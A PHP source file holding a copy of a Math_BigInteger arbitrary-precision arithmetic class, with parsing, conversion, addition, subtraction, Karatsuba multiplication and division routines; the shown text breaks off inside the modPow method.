<?php set_time_limit(0);
ini_set("display_errors", "Off");
define('MATH_BIGINTEGER_MONTGOMERY', 0);
define('MATH_BIGINTEGER_BARRETT', 1);
define('MATH_BIGINTEGER_POWEROF2', 2);
define('MATH_BIGINTEGER_CLASSIC', 3);
define('MATH_BIGINTEGER_NONE', 4);
define('MATH_BIGINTEGER_VALUE', 0);
define('MATH_BIGINTEGER_SIGN', 1);
define('MATH_BIGINTEGER_VARIABLE', 0);
define('MATH_BIGINTEGER_DATA', 1);
define('MATH_BIGINTEGER_MODE_INTERNAL', 1);
define('MATH_BIGINTEGER_MODE_BCMATH', 2);
define('MATH_BIGINTEGER_MODE_GMP', 3);
define('MATH_BIGINTEGER_KARATSUBA_CUTOFF', 25);
class Math_BigInteger {
    var $value;
    var $is_negative = false;
    var $precision = - 1;
    var $bitmask = false;
    var $hex;
    function __construct($x = 0, $base = 10) {
        if (!defined('MATH_BIGINTEGER_MODE')) {
            switch (true) {
                case extension_loaded('gmp'):
                    define('MATH_BIGINTEGER_MODE', MATH_BIGINTEGER_MODE_GMP);
                break;
                case extension_loaded('bcmath'):
                    define('MATH_BIGINTEGER_MODE', MATH_BIGINTEGER_MODE_BCMATH);
                break;
                default:
                    define('MATH_BIGINTEGER_MODE', MATH_BIGINTEGER_MODE_INTERNAL);
            }
        }
        if (extension_loaded('openssl') && !defined('MATH_BIGINTEGER_OPENSSL_DISABLE') && !defined('MATH_BIGINTEGER_OPENSSL_ENABLED')) {
            ob_start();
            @phpinfo();
            $content = ob_get_contents();
            ob_end_clean();
            preg_match_all('#OpenSSL (Header|Library) Version(.*)#im', $content, $matches);
            $versions = array();
            if (!empty($matches[1])) {
                for ($i = 0;$i < count($matches[1]);$i++) {
                    $fullVersion = trim(str_replace('=>', '', strip_tags($matches[2][$i])));
                    if (!preg_match('/(\d+\.\d+\.\d+)/i', $fullVersion, $m)) {
                        $versions[$matches[1][$i]] = $fullVersion;
                    } else {
                        $versions[$matches[1][$i]] = $m[0];
                    }
                }
            }
            switch (true) {
                case !isset($versions['Header']):
                case !isset($versions['Library']):
                case $versions['Header'] == $versions['Library']:
                case version_compare($versions['Header'], '1.0.0') >= 0 && version_compare($versions['Library'], '1.0.0') >= 0:
                    define('MATH_BIGINTEGER_OPENSSL_ENABLED', true);
                break;
                default:
                    define('MATH_BIGINTEGER_OPENSSL_DISABLE', true);
            }
        }
        if (!defined('PHP_INT_SIZE')) {
            define('PHP_INT_SIZE', 4);
        }
        if (!defined('MATH_BIGINTEGER_BASE') && MATH_BIGINTEGER_MODE == MATH_BIGINTEGER_MODE_INTERNAL) {
            switch (PHP_INT_SIZE) {
                case 8:
                    define('MATH_BIGINTEGER_BASE', 31);
                    define('MATH_BIGINTEGER_BASE_FULL', 0x80000000);
                    define('MATH_BIGINTEGER_MAX_DIGIT', 0x7FFFFFFF);
                    define('MATH_BIGINTEGER_MSB', 0x40000000);
                    define('MATH_BIGINTEGER_MAX10', 1000000000);
                    define('MATH_BIGINTEGER_MAX10_LEN', 9);
                    define('MATH_BIGINTEGER_MAX_DIGIT2', pow(2, 62));
                break;
                default:
                    define('MATH_BIGINTEGER_BASE', 26);
                    define('MATH_BIGINTEGER_BASE_FULL', 0x4000000);
                    define('MATH_BIGINTEGER_MAX_DIGIT', 0x3FFFFFF);
                    define('MATH_BIGINTEGER_MSB', 0x2000000);
                    define('MATH_BIGINTEGER_MAX10', 10000000);
                    define('MATH_BIGINTEGER_MAX10_LEN', 7);
                    define('MATH_BIGINTEGER_MAX_DIGIT2', pow(2, 52));
            }
        }
        switch (MATH_BIGINTEGER_MODE) {
            case MATH_BIGINTEGER_MODE_GMP:
                switch (true) {
                    case is_resource($x) && get_resource_type($x) == 'GMP integer':
                    case is_object($x) && get_class($x) == 'GMP':
                        $this->value = $x;
                        return;
                }
                $this->value = gmp_init(0);
            break;
            case MATH_BIGINTEGER_MODE_BCMATH:
                $this->value = '0';
            break;
            default:
                $this->value = array();
        }
        if (empty($x) && (abs($base) != 256 || $x !== '0')) {
            return;
        }
        switch ($base) {
            case -256:
                if (ord($x[0]) & 0x80) {
                    $x = ~ $x;
                    $this->is_negative = true;
                }
            case 256:
                switch (MATH_BIGINTEGER_MODE) {
                    case MATH_BIGINTEGER_MODE_GMP:
                        $sign = $this->is_negative ? '-' : '';
                        $this->value = gmp_init($sign . '0x' . bin2hex($x));
                    break;
                    case MATH_BIGINTEGER_MODE_BCMATH:
                        $len = (strlen($x) + 3) & 0xFFFFFFFC;
                        $x = str_pad($x, $len, chr(0), STR_PAD_LEFT);
                        for ($i = 0;$i < $len;$i+= 4) {
                            $this->value = bcmul($this->value, '4294967296', 0);
                            $this->value = bcadd($this->value, 0x1000000 * ord($x[$i]) + ((ord($x[$i + 1]) << 16) | (ord($x[$i + 2]) << 8) | ord($x[$i + 3])), 0);
                        }
                        if ($this->is_negative) {
                            $this->value = '-' . $this->value;
                        }
                    break;
                    default:
                        while (strlen($x)) {
                            $this->value[] = $this->_bytes2int($this->_base256_rshift($x, MATH_BIGINTEGER_BASE));
                        }
                }
                if ($this->is_negative) {
                    if (MATH_BIGINTEGER_MODE != MATH_BIGINTEGER_MODE_INTERNAL) {
                        $this->is_negative = false;
                    }
                    $temp = $this->add(new Math_BigInteger('-1'));
                    $this->value = $temp->value;
                }
            break;
            case 16:
            case -16:
                if ($base > 0 && $x[0] == '-') {
                    $this->is_negative = true;
                    $x = substr($x, 1);
                }
                $x = preg_replace('#^(?:0x)?([A-Fa-f0-9]*).*#', '$1', $x);
                $is_negative = false;
                if ($base < 0 && hexdec($x[0]) >= 8) {
                    $this->is_negative = $is_negative = true;
                    $x = bin2hex(~pack('H*', $x));
                }
                switch (MATH_BIGINTEGER_MODE) {
                    case MATH_BIGINTEGER_MODE_GMP:
                        $temp = $this->is_negative ? '-0x' . $x : '0x' . $x;
                        $this->value = gmp_init($temp);
                        $this->is_negative = false;
                    break;
                    case MATH_BIGINTEGER_MODE_BCMATH:
                        $x = (strlen($x) & 1) ? '0' . $x : $x;
                        $temp = new Math_BigInteger(pack('H*', $x), 256);
                        $this->value = $this->is_negative ? '-' . $temp->value : $temp->value;
                        $this->is_negative = false;
                    break;
                    default:
                        $x = (strlen($x) & 1) ? '0' . $x : $x;
                        $temp = new Math_BigInteger(pack('H*', $x), 256);
                        $this->value = $temp->value;
                }
                if ($is_negative) {
                    $temp = $this->add(new Math_BigInteger('-1'));
                    $this->value = $temp->value;
                }
            break;
            case 10:
            case -10:
                $x = preg_replace('#(?<!^)(?:-).*|(?<=^|-)0*|[^-0-9].*#', '', $x);
                switch (MATH_BIGINTEGER_MODE) {
                    case MATH_BIGINTEGER_MODE_GMP:
                        $this->value = gmp_init($x);
                    break;
                    case MATH_BIGINTEGER_MODE_BCMATH:
                        $this->value = $x === '-' ? '0' : (string)$x;
                    break;
                    default:
                        $temp = new Math_BigInteger();
                        $multiplier = new Math_BigInteger();
                        $multiplier->value = array(MATH_BIGINTEGER_MAX10);
                        if ($x[0] == '-') {
                            $this->is_negative = true;
                            $x = substr($x, 1);
                        }
                        $x = str_pad($x, strlen($x) + ((MATH_BIGINTEGER_MAX10_LEN - 1) * strlen($x)) % MATH_BIGINTEGER_MAX10_LEN, 0, STR_PAD_LEFT);
                        while (strlen($x)) {
                            $temp = $temp->multiply($multiplier);
                            $temp = $temp->add(new Math_BigInteger($this->_int2bytes(substr($x, 0, MATH_BIGINTEGER_MAX10_LEN)), 256));
                            $x = substr($x, MATH_BIGINTEGER_MAX10_LEN);
                        }
                        $this->value = $temp->value;
                }
            break;
            case 2:
            case -2:
                if ($base > 0 && $x[0] == '-') {
                    $this->is_negative = true;
                    $x = substr($x, 1);
                }
                $x = preg_replace('#^([01]*).*#', '$1', $x);
                $x = str_pad($x, strlen($x) + (3 * strlen($x)) % 4, 0, STR_PAD_LEFT);
                $str = '0x';
                while (strlen($x)) {
                    $part = substr($x, 0, 4);
                    $str.= dechex(bindec($part));
                    $x = substr($x, 4);
                }
                if ($this->is_negative) {
                    $str = '-' . $str;
                }
                $temp = new Math_BigInteger($str, 8 * $base);
                $this->value = $temp->value;
                $this->is_negative = $temp->is_negative;
            break;
            default:
        }
}
function Math_BigInteger($x = 0, $base = 10) {
    $this->__construct($x, $base);
}
function toBytes($twos_compliment = false) {
    if ($twos_compliment) {
        $comparison = $this->compare(new Math_BigInteger());
        if ($comparison == 0) {
            return $this->precision > 0 ? str_repeat(chr(0), ($this->precision + 1) >> 3) : '';
        }
        $temp = $comparison < 0 ? $this->add(new Math_BigInteger(1)) : $this->copy();
        $bytes = $temp->toBytes();
        if (empty($bytes)) {
            $bytes = chr(0);
        }
        if (ord($bytes[0]) & 0x80) {
            $bytes = chr(0) . $bytes;
        }
        return $comparison < 0 ? ~$bytes : $bytes;
    }
    switch (MATH_BIGINTEGER_MODE) {
        case MATH_BIGINTEGER_MODE_GMP:
            if (gmp_cmp($this->value, gmp_init(0)) == 0) {
                return $this->precision > 0 ? str_repeat(chr(0), ($this->precision + 1) >> 3) : '';
            }
            $temp = gmp_strval(gmp_abs($this->value), 16);
            $temp = (strlen($temp) & 1) ? '0' . $temp : $temp;
            $temp = pack('H*', $temp);
            return $this->precision > 0 ? substr(str_pad($temp, $this->precision >> 3, chr(0), STR_PAD_LEFT), -($this->precision >> 3)) : ltrim($temp, chr(0));
        case MATH_BIGINTEGER_MODE_BCMATH:
            if ($this->value === '0') {
                return $this->precision > 0 ? str_repeat(chr(0), ($this->precision + 1) >> 3) : '';
            }
            $value = '';
            $current = $this->value;
            if ($current[0] == '-') {
                $current = substr($current, 1);
            }
            while (bccomp($current, '0', 0) > 0) {
                $temp = bcmod($current, '16777216');
                $value = chr($temp >> 16) . chr($temp >> 8) . chr($temp) . $value;
                $current = bcdiv($current, '16777216', 0);
            }
            return $this->precision > 0 ? substr(str_pad($value, $this->precision >> 3, chr(0), STR_PAD_LEFT), -($this->precision >> 3)) : ltrim($value, chr(0));
    }
    if (!count($this->value)) {
        return $this->precision > 0 ? str_repeat(chr(0), ($this->precision + 1) >> 3) : '';
    }
    $result = $this->_int2bytes($this->value[count($this->value) - 1]);
    $temp = $this->copy();
    for ($i = count($temp->value) - 2;$i >= 0;--$i) {
        $temp->_base256_lshift($result, MATH_BIGINTEGER_BASE);
        $result = $result | str_pad($temp->_int2bytes($temp->value[$i]), strlen($result), chr(0), STR_PAD_LEFT);
    }
    return $this->precision > 0 ? str_pad(substr($result, -(($this->precision + 7) >> 3)), ($this->precision + 7) >> 3, chr(0), STR_PAD_LEFT) : $result;
}
function toHex($twos_compliment = false) {
    return bin2hex($this->toBytes($twos_compliment));
}
function toBits($twos_compliment = false) {
    $hex = $this->toHex($twos_compliment);
    $bits = '';
    for ($i = strlen($hex) - 8, $start = strlen($hex) & 7;$i >= $start;$i-= 8) {
        $bits = str_pad(decbin(hexdec(substr($hex, $i, 8))), 32, '0', STR_PAD_LEFT) . $bits;
    }
    if ($start) {
        $bits = str_pad(decbin(hexdec(substr($hex, 0, $start))), 8, '0', STR_PAD_LEFT) . $bits;
    }
    $result = $this->precision > 0 ? substr($bits, -$this->precision) : ltrim($bits, '0');
    if ($twos_compliment && $this->compare(new Math_BigInteger()) > 0 && $this->precision <= 0) {
        return '0' . $result;
    }
    return $result;
}
function toString() {
    switch (MATH_BIGINTEGER_MODE) {
        case MATH_BIGINTEGER_MODE_GMP:
            return gmp_strval($this->value);
        case MATH_BIGINTEGER_MODE_BCMATH:
            if ($this->value === '0') {
                return '0';
            }
            return ltrim($this->value, '0');
    }
    if (!count($this->value)) {
        return '0';
    }
    $temp = $this->copy();
    $temp->is_negative = false;
    $divisor = new Math_BigInteger();
    $divisor->value = array(MATH_BIGINTEGER_MAX10);
    $result = '';
    while (count($temp->value)) {
        list($temp, $mod) = $temp->divide($divisor);
        $result = str_pad(isset($mod->value[0]) ? $mod->value[0] : '', MATH_BIGINTEGER_MAX10_LEN, '0', STR_PAD_LEFT) . $result;
    }
    $result = ltrim($result, '0');
    if (empty($result)) {
        $result = '0';
    }
    if ($this->is_negative) {
        $result = '-' . $result;
    }
    return $result;
}
function copy() {
    $temp = new Math_BigInteger();
    $temp->value = $this->value;
    $temp->is_negative = $this->is_negative;
    $temp->precision = $this->precision;
    $temp->bitmask = $this->bitmask;
    return $temp;
}
function __toString() {
    return $this->toString();
}
function __clone() {
    return $this->copy();
}
function __sleep() {
    $this->hex = $this->toHex(true);
    $vars = array('hex');
    if ($this->precision > 0) {
        $vars[] = 'precision';
    }
    return $vars;
}
function __wakeup() {
    $temp = new Math_BigInteger($this->hex, -16);
    $this->value = $temp->value;
    $this->is_negative = $temp->is_negative;
    if ($this->precision > 0) {
        $this->setPrecision($this->precision);
    }
}
function __debugInfo() {
    $opts = array();
    switch (MATH_BIGINTEGER_MODE) {
        case MATH_BIGINTEGER_MODE_GMP:
            $engine = 'gmp';
        break;
        case MATH_BIGINTEGER_MODE_BCMATH:
            $engine = 'bcmath';
        break;
        case MATH_BIGINTEGER_MODE_INTERNAL:
            $engine = 'internal';
            $opts[] = PHP_INT_SIZE == 8 ? '64-bit' : '32-bit';
    }
    if (MATH_BIGINTEGER_MODE != MATH_BIGINTEGER_MODE_GMP && defined('MATH_BIGINTEGER_OPENSSL_ENABLED')) {
        $opts[] = 'OpenSSL';
    }
    if (!empty($opts)) {
        $engine.= ' (' . implode($opts, ', ') . ')';
    }
    return array('value' => '0x' . $this->toHex(true), 'engine' => $engine);
}
function add($y) {
    switch (MATH_BIGINTEGER_MODE) {
        case MATH_BIGINTEGER_MODE_GMP:
            $temp = new Math_BigInteger();
            $temp->value = gmp_add($this->value, $y->value);
            return $this->_normalize($temp);
        case MATH_BIGINTEGER_MODE_BCMATH:
            $temp = new Math_BigInteger();
            $temp->value = bcadd($this->value, $y->value, 0);
            return $this->_normalize($temp);
    }
    $temp = $this->_add($this->value, $this->is_negative, $y->value, $y->is_negative);
    $result = new Math_BigInteger();
    $result->value = $temp[MATH_BIGINTEGER_VALUE];
    $result->is_negative = $temp[MATH_BIGINTEGER_SIGN];
    return $this->_normalize($result);
}
function _add($x_value, $x_negative, $y_value, $y_negative) {
    $x_size = count($x_value);
    $y_size = count($y_value);
    if ($x_size == 0) {
        return array(MATH_BIGINTEGER_VALUE => $y_value, MATH_BIGINTEGER_SIGN => $y_negative);
    } elseif ($y_size == 0) {
        return array(MATH_BIGINTEGER_VALUE => $x_value, MATH_BIGINTEGER_SIGN => $x_negative);
    }
    if ($x_negative != $y_negative) {
        if ($x_value == $y_value) {
            return array(MATH_BIGINTEGER_VALUE => array(), MATH_BIGINTEGER_SIGN => false);
        }
        $temp = $this->_subtract($x_value, false, $y_value, false);
        $temp[MATH_BIGINTEGER_SIGN] = $this->_compare($x_value, false, $y_value, false) > 0 ? $x_negative : $y_negative;
        return $temp;
    }
    if ($x_size < $y_size) {
        $size = $x_size;
        $value = $y_value;
    } else {
        $size = $y_size;
        $value = $x_value;
    }
    $value[count($value) ] = 0;
    $carry = 0;
    for ($i = 0, $j = 1;$j < $size;$i+= 2, $j+= 2) {
        $sum = $x_value[$j] * MATH_BIGINTEGER_BASE_FULL + $x_value[$i] + $y_value[$j] * MATH_BIGINTEGER_BASE_FULL + $y_value[$i] + $carry;
        $carry = $sum >= MATH_BIGINTEGER_MAX_DIGIT2;
        $sum = $carry ? $sum - MATH_BIGINTEGER_MAX_DIGIT2 : $sum;
        $temp = MATH_BIGINTEGER_BASE === 26 ? intval($sum / 0x4000000) : ($sum >> 31);
        $value[$i] = (int)($sum - MATH_BIGINTEGER_BASE_FULL * $temp);
        $value[$j] = $temp;
    }
    if ($j == $size) {
        $sum = $x_value[$i] + $y_value[$i] + $carry;
        $carry = $sum >= MATH_BIGINTEGER_BASE_FULL;
        $value[$i] = $carry ? $sum - MATH_BIGINTEGER_BASE_FULL : $sum;
        ++$i;
    }
    if ($carry) {
        for (;$value[$i] == MATH_BIGINTEGER_MAX_DIGIT;++$i) {
            $value[$i] = 0;
        }
        ++$value[$i];
    }
    return array(MATH_BIGINTEGER_VALUE => $this->_trim($value), MATH_BIGINTEGER_SIGN => $x_negative);
}
function subtract($y) {
    switch (MATH_BIGINTEGER_MODE) {
        case MATH_BIGINTEGER_MODE_GMP:
            $temp = new Math_BigInteger();
            $temp->value = gmp_sub($this->value, $y->value);
            return $this->_normalize($temp);
        case MATH_BIGINTEGER_MODE_BCMATH:
            $temp = new Math_BigInteger();
            $temp->value = bcsub($this->value, $y->value, 0);
            return $this->_normalize($temp);
    }
    $temp = $this->_subtract($this->value, $this->is_negative, $y->value, $y->is_negative);
    $result = new Math_BigInteger();
    $result->value = $temp[MATH_BIGINTEGER_VALUE];
    $result->is_negative = $temp[MATH_BIGINTEGER_SIGN];
    return $this->_normalize($result);
}
function _subtract($x_value, $x_negative, $y_value, $y_negative) {
    $x_size = count($x_value);
    $y_size = count($y_value);
    if ($x_size == 0) {
        return array(MATH_BIGINTEGER_VALUE => $y_value, MATH_BIGINTEGER_SIGN => !$y_negative);
    } elseif ($y_size == 0) {
        return array(MATH_BIGINTEGER_VALUE => $x_value, MATH_BIGINTEGER_SIGN => $x_negative);
    }
    if ($x_negative != $y_negative) {
        $temp = $this->_add($x_value, false, $y_value, false);
        $temp[MATH_BIGINTEGER_SIGN] = $x_negative;
        return $temp;
    }
    $diff = $this->_compare($x_value, $x_negative, $y_value, $y_negative);
    if (!$diff) {
        return array(MATH_BIGINTEGER_VALUE => array(), MATH_BIGINTEGER_SIGN => false);
    }
    if ((!$x_negative && $diff < 0) || ($x_negative && $diff > 0)) {
        $temp = $x_value;
        $x_value = $y_value;
        $y_value = $temp;
        $x_negative = !$x_negative;
        $x_size = count($x_value);
        $y_size = count($y_value);
    }
    $carry = 0;
    for ($i = 0, $j = 1;$j < $y_size;$i+= 2, $j+= 2) {
        $sum = $x_value[$j] * MATH_BIGINTEGER_BASE_FULL + $x_value[$i] - $y_value[$j] * MATH_BIGINTEGER_BASE_FULL - $y_value[$i] - $carry;
        $carry = $sum < 0;
        $sum = $carry ? $sum + MATH_BIGINTEGER_MAX_DIGIT2 : $sum;
        $temp = MATH_BIGINTEGER_BASE === 26 ? intval($sum / 0x4000000) : ($sum >> 31);
        $x_value[$i] = (int)($sum - MATH_BIGINTEGER_BASE_FULL * $temp);
        $x_value[$j] = $temp;
    }
    if ($j == $y_size) {
        $sum = $x_value[$i] - $y_value[$i] - $carry;
        $carry = $sum < 0;
        $x_value[$i] = $carry ? $sum + MATH_BIGINTEGER_BASE_FULL : $sum;
        ++$i;
    }
    if ($carry) {
        for (;!$x_value[$i];++$i) {
            $x_value[$i] = MATH_BIGINTEGER_MAX_DIGIT;
        }
        --$x_value[$i];
    }
    return array(MATH_BIGINTEGER_VALUE => $this->_trim($x_value), MATH_BIGINTEGER_SIGN => $x_negative);
}
function multiply($x) {
    switch (MATH_BIGINTEGER_MODE) {
        case MATH_BIGINTEGER_MODE_GMP:
            $temp = new Math_BigInteger();
            $temp->value = gmp_mul($this->value, $x->value);
            return $this->_normalize($temp);
        case MATH_BIGINTEGER_MODE_BCMATH:
            $temp = new Math_BigInteger();
            $temp->value = bcmul($this->value, $x->value, 0);
            return $this->_normalize($temp);
    }
    $temp = $this->_multiply($this->value, $this->is_negative, $x->value, $x->is_negative);
    $product = new Math_BigInteger();
    $product->value = $temp[MATH_BIGINTEGER_VALUE];
    $product->is_negative = $temp[MATH_BIGINTEGER_SIGN];
    return $this->_normalize($product);
}
function _multiply($x_value, $x_negative, $y_value, $y_negative) {
    $x_length = count($x_value);
    $y_length = count($y_value);
    if (!$x_length || !$y_length) {
        return array(MATH_BIGINTEGER_VALUE => array(), MATH_BIGINTEGER_SIGN => false);
    }
    return array(MATH_BIGINTEGER_VALUE => min($x_length, $y_length) < 2 * MATH_BIGINTEGER_KARATSUBA_CUTOFF ? $this->_trim($this->_regularMultiply($x_value, $y_value)) : $this->_trim($this->_karatsuba($x_value, $y_value)), MATH_BIGINTEGER_SIGN => $x_negative != $y_negative);
}
function _regularMultiply($x_value, $y_value) {
    $x_length = count($x_value);
    $y_length = count($y_value);
    if (!$x_length || !$y_length) {
        return array();
    }
    if ($x_length < $y_length) {
        $temp = $x_value;
        $x_value = $y_value;
        $y_value = $temp;
        $x_length = count($x_value);
        $y_length = count($y_value);
    }
    $product_value = $this->_array_repeat(0, $x_length + $y_length);
    $carry = 0;
    for ($j = 0;$j < $x_length;++$j) {
        $temp = $x_value[$j] * $y_value[0] + $carry;
        $carry = MATH_BIGINTEGER_BASE === 26 ? intval($temp / 0x4000000) : ($temp >> 31);
        $product_value[$j] = (int)($temp - MATH_BIGINTEGER_BASE_FULL * $carry);
    }
    $product_value[$j] = $carry;
    for ($i = 1;$i < $y_length;++$i) {
        $carry = 0;
        for ($j = 0, $k = $i;$j < $x_length;++$j, ++$k) {
            $temp = $product_value[$k] + $x_value[$j] * $y_value[$i] + $carry;
            $carry = MATH_BIGINTEGER_BASE === 26 ? intval($temp / 0x4000000) : ($temp >> 31);
            $product_value[$k] = (int)($temp - MATH_BIGINTEGER_BASE_FULL * $carry);
        }
        $product_value[$k] = $carry;
    }
    return $product_value;
}
function _karatsuba($x_value, $y_value) {
    $m = min(count($x_value) >> 1, count($y_value) >> 1);
    if ($m < MATH_BIGINTEGER_KARATSUBA_CUTOFF) {
        return $this->_regularMultiply($x_value, $y_value);
    }
    $x1 = array_slice($x_value, $m);
    $x0 = array_slice($x_value, 0, $m);
    $y1 = array_slice($y_value, $m);
    $y0 = array_slice($y_value, 0, $m);
    $z2 = $this->_karatsuba($x1, $y1);
    $z0 = $this->_karatsuba($x0, $y0);
    $z1 = $this->_add($x1, false, $x0, false);
    $temp = $this->_add($y1, false, $y0, false);
    $z1 = $this->_karatsuba($z1[MATH_BIGINTEGER_VALUE], $temp[MATH_BIGINTEGER_VALUE]);
    $temp = $this->_add($z2, false, $z0, false);
    $z1 = $this->_subtract($z1, false, $temp[MATH_BIGINTEGER_VALUE], false);
    $z2 = array_merge(array_fill(0, 2 * $m, 0), $z2);
    $z1[MATH_BIGINTEGER_VALUE] = array_merge(array_fill(0, $m, 0), $z1[MATH_BIGINTEGER_VALUE]);
    $xy = $this->_add($z2, false, $z1[MATH_BIGINTEGER_VALUE], $z1[MATH_BIGINTEGER_SIGN]);
    $xy = $this->_add($xy[MATH_BIGINTEGER_VALUE], $xy[MATH_BIGINTEGER_SIGN], $z0, false);
    return $xy[MATH_BIGINTEGER_VALUE];
}
function _square($x = false) {
    return count($x) < 2 * MATH_BIGINTEGER_KARATSUBA_CUTOFF ? $this->_trim($this->_baseSquare($x)) : $this->_trim($this->_karatsubaSquare($x));
}
function _baseSquare($value) {
    if (empty($value)) {
        return array();
    }
    $square_value = $this->_array_repeat(0, 2 * count($value));
    for ($i = 0, $max_index = count($value) - 1;$i <= $max_index;++$i) {
        $i2 = $i << 1;
        $temp = $square_value[$i2] + $value[$i] * $value[$i];
        $carry = MATH_BIGINTEGER_BASE === 26 ? intval($temp / 0x4000000) : ($temp >> 31);
        $square_value[$i2] = (int)($temp - MATH_BIGINTEGER_BASE_FULL * $carry);
        for ($j = $i + 1, $k = $i2 + 1;$j <= $max_index;++$j, ++$k) {
            $temp = $square_value[$k] + 2 * $value[$j] * $value[$i] + $carry;
            $carry = MATH_BIGINTEGER_BASE === 26 ? intval($temp / 0x4000000) : ($temp >> 31);
            $square_value[$k] = (int)($temp - MATH_BIGINTEGER_BASE_FULL * $carry);
        }
        $square_value[$i + $max_index + 1] = $carry;
    }
    return $square_value;
}
function _karatsubaSquare($value) {
    $m = count($value) >> 1;
    if ($m < MATH_BIGINTEGER_KARATSUBA_CUTOFF) {
        return $this->_baseSquare($value);
    }
    $x1 = array_slice($value, $m);
    $x0 = array_slice($value, 0, $m);
    $z2 = $this->_karatsubaSquare($x1);
    $z0 = $this->_karatsubaSquare($x0);
    $z1 = $this->_add($x1, false, $x0, false);
    $z1 = $this->_karatsubaSquare($z1[MATH_BIGINTEGER_VALUE]);
    $temp = $this->_add($z2, false, $z0, false);
    $z1 = $this->_subtract($z1, false, $temp[MATH_BIGINTEGER_VALUE], false);
    $z2 = array_merge(array_fill(0, 2 * $m, 0), $z2);
    $z1[MATH_BIGINTEGER_VALUE] = array_merge(array_fill(0, $m, 0), $z1[MATH_BIGINTEGER_VALUE]);
    $xx = $this->_add($z2, false, $z1[MATH_BIGINTEGER_VALUE], $z1[MATH_BIGINTEGER_SIGN]);
    $xx = $this->_add($xx[MATH_BIGINTEGER_VALUE], $xx[MATH_BIGINTEGER_SIGN], $z0, false);
    return $xx[MATH_BIGINTEGER_VALUE];
}
function divide($y) {
    switch (MATH_BIGINTEGER_MODE) {
        case MATH_BIGINTEGER_MODE_GMP:
            $quotient = new Math_BigInteger();
            $remainder = new Math_BigInteger();
            list($quotient->value, $remainder->value) = gmp_div_qr($this->value, $y->value);
            if (gmp_sign($remainder->value) < 0) {
                $remainder->value = gmp_add($remainder->value, gmp_abs($y->value));
            }
            return array($this->_normalize($quotient), $this->_normalize($remainder));
        case MATH_BIGINTEGER_MODE_BCMATH:
            $quotient = new Math_BigInteger();
            $remainder = new Math_BigInteger();
            $quotient->value = bcdiv($this->value, $y->value, 0);
            $remainder->value = bcmod($this->value, $y->value);
            if ($remainder->value[0] == '-') {
                $remainder->value = bcadd($remainder->value, $y->value[0] == '-' ? substr($y->value, 1) : $y->value, 0);
            }
            return array($this->_normalize($quotient), $this->_normalize($remainder));
    }
    if (count($y->value) == 1) {
        list($q, $r) = $this->_divide_digit($this->value, $y->value[0]);
        $quotient = new Math_BigInteger();
        $remainder = new Math_BigInteger();
        $quotient->value = $q;
        $remainder->value = array($r);
        $quotient->is_negative = $this->is_negative != $y->is_negative;
        return array($this->_normalize($quotient), $this->_normalize($remainder));
    }
    static $zero;
    if (!isset($zero)) {
        $zero = new Math_BigInteger();
    }
    $x = $this->copy();
    $y = $y->copy();
    $x_sign = $x->is_negative;
    $y_sign = $y->is_negative;
    $x->is_negative = $y->is_negative = false;
    $diff = $x->compare($y);
    if (!$diff) {
        $temp = new Math_BigInteger();
        $temp->value = array(1);
        $temp->is_negative = $x_sign != $y_sign;
        return array($this->_normalize($temp), $this->_normalize(new Math_BigInteger()));
    }
    if ($diff < 0) {
        if ($x_sign) {
            $x = $y->subtract($x);
        }
        return array($this->_normalize(new Math_BigInteger()), $this->_normalize($x));
    }
    $msb = $y->value[count($y->value) - 1];
    for ($shift = 0;!($msb & MATH_BIGINTEGER_MSB);++$shift) {
        $msb <<= 1;
    }
    $x->_lshift($shift);
    $y->_lshift($shift);
    $y_value = & $y->value;
    $x_max = count($x->value) - 1;
    $y_max = count($y->value) - 1;
    $quotient = new Math_BigInteger();
    $quotient_value = & $quotient->value;
    $quotient_value = $this->_array_repeat(0, $x_max - $y_max + 1);
    static $temp, $lhs, $rhs;
    if (!isset($temp)) {
        $temp = new Math_BigInteger();
        $lhs = new Math_BigInteger();
        $rhs = new Math_BigInteger();
    }
    $temp_value = & $temp->value;
    $rhs_value = & $rhs->value;
    $temp_value = array_merge($this->_array_repeat(0, $x_max - $y_max), $y_value);
    while ($x->compare($temp) >= 0) {
        ++$quotient_value[$x_max - $y_max];
        $x = $x->subtract($temp);
        $x_max = count($x->value) - 1;
    }
    for ($i = $x_max;$i >= $y_max + 1;--$i) {
        $x_value = & $x->value;
        $x_window = array(isset($x_value[$i]) ? $x_value[$i] : 0, isset($x_value[$i - 1]) ? $x_value[$i - 1] : 0, isset($x_value[$i - 2]) ? $x_value[$i - 2] : 0);
        $y_window = array($y_value[$y_max], ($y_max > 0) ? $y_value[$y_max - 1] : 0);
        $q_index = $i - $y_max - 1;
        if ($x_window[0] == $y_window[0]) {
            $quotient_value[$q_index] = MATH_BIGINTEGER_MAX_DIGIT;
        } else {
            $quotient_value[$q_index] = $this->_safe_divide($x_window[0] * MATH_BIGINTEGER_BASE_FULL + $x_window[1], $y_window[0]);
        }
        $temp_value = array($y_window[1], $y_window[0]);
        $lhs->value = array($quotient_value[$q_index]);
        $lhs = $lhs->multiply($temp);
        $rhs_value = array($x_window[2], $x_window[1], $x_window[0]);
        while ($lhs->compare($rhs) > 0) {
            --$quotient_value[$q_index];
            $lhs->value = array($quotient_value[$q_index]);
            $lhs = $lhs->multiply($temp);
        }
        $adjust = $this->_array_repeat(0, $q_index);
        $temp_value = array($quotient_value[$q_index]);
        $temp = $temp->multiply($y);
        $temp_value = & $temp->value;
        $temp_value = array_merge($adjust, $temp_value);
        $x = $x->subtract($temp);
        if ($x->compare($zero) < 0) {
            $temp_value = array_merge($adjust, $y_value);
            $x = $x->add($temp);
            --$quotient_value[$q_index];
        }
        $x_max = count($x_value) - 1;
    }
    $x->_rshift($shift);
    $quotient->is_negative = $x_sign != $y_sign;
    if ($x_sign) {
        $y->_rshift($shift);
        $x = $y->subtract($x);
    }
    return array($this->_normalize($quotient), $this->_normalize($x));
}
function _divide_digit($dividend, $divisor) {
    $carry = 0;
    $result = array();
    for ($i = count($dividend) - 1;$i >= 0;--$i) {
        $temp = MATH_BIGINTEGER_BASE_FULL * $carry + $dividend[$i];
        $result[$i] = $this->_safe_divide($temp, $divisor);
        $carry = (int)($temp - $divisor * $result[$i]);
    }
    return array($result, $carry);
}
function modPow($e, $n) {
    $n = $this->bitmask !== false && $this->bitmask->compare($n) < 0 ? $this->bitmask : $n->abs();
    if ($e->compare(new Math_BigInteger()) < 0) {
        $e = $e->abs();
        $temp = $this->modInverse($n);
        if ($temp === false) {
            return false;
        }
        return $this->_normalize($temp->modPow($e, $n));
    }
    if (MATH_BIGINTEGER_MODE == MATH_BIGINTEGER_MODE_GMP) {
        $temp = new Math_BigInteger();
